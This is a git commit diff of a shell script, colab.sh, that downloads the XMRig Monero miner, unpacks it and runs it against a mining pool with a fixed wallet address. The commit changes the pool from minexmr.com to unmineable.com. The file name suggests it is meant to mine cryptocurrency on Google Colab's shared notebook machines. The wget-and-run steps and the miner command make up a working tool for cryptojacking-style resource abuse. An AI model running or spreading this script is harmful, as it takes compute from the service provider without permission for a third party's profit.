bf595232b5098c03550457ada23c78d35aa6d3cb
AyuhsAOpsj2 <112705370+AyuhsAOpsj2@users.noreply.github.com>
2022-09-02 18:42:17 +0530

    Update colab.sh

--- colab.sh
+++ colab.sh
@@ -10,4 +10,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
 tar xvzf xmrig-6.17.0-linux-x64.tar.gz
 cd xmrig-6.17.0
-./xmrig -o us-west.minexmr.com:443 -u 46VVQ2nV4AZGZQmUBN4ktb3FdMvZLY7Bjdy89FLXc9ebDSiGiw3vhhiFkFqNiHEezpjDN41eU2cEUSjsk3KddWKWQzAkaP9 -k --tls --rig-id GC-US
+./xmrig -o rx.unmineable.com:3333 -u 46VVQ2nV4AZGZQmUBN4ktb3FdMvZLY7Bjdy89FLXc9ebDSiGiw3vhhiFkFqNiHEezpjDN41eU2cEUSjsk3KddWKWQzAkaP9.qw
